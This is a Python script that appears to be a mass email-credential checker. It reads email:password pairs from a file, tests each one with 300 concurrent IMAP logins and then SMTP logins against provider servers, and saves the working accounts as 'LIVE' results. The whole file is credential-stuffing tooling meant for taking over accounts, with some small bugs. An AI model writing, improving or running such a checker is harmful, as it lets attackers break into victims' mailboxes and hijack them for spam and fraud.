from timeit import default_timer as timer
from shutil import copyfile
from pyautogui import hotkey
from os import path, rename, system

import imaplib
import smtplib
import signal
import re
import json

import gevent
from gevent.queue import *
from gevent.event import Event
from gevent import monkey
import socket

hosts_smtp_json = json.load(open('smtp_hoster.json', 'r'))
total = 0
c_valid = 0
c_invalid = 0
c_smtp = 0

check_smtp = True

def sub_worker(t):
    global c_invalid
    global c_valid
    if evt.is_set():
        return

    task = t.split(':')
    host = get_imapConfig(task[0])

    if not host:
        q_invalid.put(t[0])
        c_invalid += 1
        return
    
    l = imap(task[0], task[1], host)
    
    if l == 'OK':
        print("LIVE IMAP : ", t)
        if check_smtp:
            if smtp_check(t):
                print("LIVE SMTP: ", t)
                q_smtp.pt(t)
                c_smtp += 1

        q_valid.put(t)
        c_valid += 1
    else:
        print("DIE : ", t)
        q_invalid.put(t)
        c_invalid += 1
    return

def get_host_smtp(t):
    hostt = hosts_smtp_json['hosters'][t]
    port = hosts_smtp_json['hosterports'][hostt]

    return (hostt, port)

def smtp_check(t):
    task = t.split(":")
    to = "rajiorap12@outlook.com"
    fail = 0
    try:
        h = task[0].split("@")[1]
        hostt, port = get_host_smtp(h)
    except Exception as e:
        print(e)
    # for i in host_smtp:
    try:
        mailserver = smtplib.SMTP(hostt, port)
        mailserver.login(task[0], task[1])
        mailserver.close()
        return True
    except Exception as e:
        print(e)
        pass
    try:
        mailserver = smtplib.SMTP(hostt, port)
        mailserver.ehlo()
        mailserver.starttls()
        mailserver.login(task[0], task[1])
        mailserver.close()
        return True
    except Exception as e:
        print(e)
        pass

    return False

def worker(worker_id):
    try:
        while not evt.is_set():
            t = q.get(block=True, timeout=2)
            sub_worker(t)
    except BaseException as e:
        # print(e)
        pass

def imap(usr, pw, host):
    socket.setdefaulttimeout(10)
    usr = usr.lower()
    try:
        if len(host) < 2:
            port = 993
        else:
            port = int(host[1])

        mail = imaplib.IMAP4_SSL(str(host[0]), port)
        a = str(mail.login(usr, pw))
        return a[2: 4]
    except imaplib.IMAP4.error:
        return False
    except BaseException as e:
        return "Error"


def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        # print(hoster)

        return ImapConfig[hoster]
    except BaseException as e:
        # print("GeT IMAP",e)
        return False

def handler(signum, frame):
    print("Shutting down Wait for a moment....")
    evt.set()

def loader():
    global total
    try:
        with open(file_in, 'r') as f:
            for i in f.readlines():
                q.put_nowait(i.strip())
                total += 1

    except IOError:
        print("No Input file", file_in)
        exit()
    except BaseException as e:
        print(" LOADER ", e)
        pass

def init_ImapConfig():
    global ImapConfig
    ImapConfig = dict()
    try:
        with open('hoster.dat', 'r') as f:
            for line in f:
                if len(line) > 1:
                    hoster = line.strip().split(':')
                    ImapConfig[hoster[0]] = (hoster[1], hoster[2])
    except BaseException as e:
        # print("INIT IMAP", e)
        print("[Error] Hoster.dat")

def write_valid():
    try:
        with open(file_out, 'a') as f:
            while True:
                try:
                    t = q_valid.get(timeout=2)
                except:
                    break

                f.write(t+'\n')
    except:
        pass

def write_invalid():
    try:
        with open(file_in[:-4]+'_invalid.txt', 'a') as f:
            while True:
                try:
                    t = q_valid.get(timeout=2)
                except:
                    break
                f.write(t+'\n')
    except:
        pass

def asynchronous():
    threads = []
    threads.append(gevent.spawn(loader))
    for i in range(0, workers):
        threads.append(gevent.spawn(worker, i))
    start = timer()
    gevent.joinall(threads)
    end = timer()

    print("[INFO] TIME Elapsed: " + str(end - start)[:5], ' seconds')
    print("DONE!!!\nValid = ", c_valid, "\nInvalid = ", c_invalid, "\nSmtp_valid =", c_smtp)
    evt.set()
    write_valid()
    write_invalid()

file_in = 'mail_pass.txt'
file_out = 'result.txt'
workers = 300

monkey.patch_all()

evt = Event()
signal.signal(signal.SIGINT, handler)

init_ImapConfig()

q = gevent.queue.Queue(200000)
q_valid = gevent.queue.Queue()
q_invalid = gevent.queue.Queue()
q_smtp = gevent.queue.Queue()

try:
    asynchronous()
except:
    pass